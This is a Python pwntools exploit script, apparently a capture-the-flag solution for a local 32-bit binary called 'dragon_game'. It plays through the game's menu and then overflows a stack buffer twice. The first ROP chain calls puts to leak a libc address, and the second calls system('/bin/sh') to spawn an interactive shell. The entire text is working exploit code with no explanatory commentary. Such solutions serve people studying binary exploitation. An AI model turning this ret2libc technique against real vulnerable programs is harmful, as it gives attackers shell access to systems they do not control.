#coding=utf8
from pwn import *

def choice(num):
	sh.sendlineafter("HP.\n", str(num))

def win():
	sh.sendlineafter("name:\n", "aaaa")
	choice(2)
	choice(2)
	choice(3)
	choice(3)
	choice(3)
	choice(3)
	choice(3)
	choice(3)

sh = process("./dragon_game")
pwn = ELF("./dragon_game")
libc = pwn.libc
puts_plt = pwn.plt["puts"]
puts_got = pwn.got["puts"]
main = pwn.symbols["main"]

win()
payload = flat(['a'*0x28, puts_plt, main, puts_got])
sh.recvuntil("epitaph:\n")
sh.sendline(payload)
libc.address = u32(sh.recv(4)) - libc.symbols["puts"]
log.info("libc base address: 0x%x" %libc.address)
system = libc.symbols["system"]
bin_sh = next(libc.search("/bin/sh"))
win()
payload = flat(['a'*0x28, system, 0xDEADBEEF, bin_sh])
sh.sendline(payload)
sh.interactive()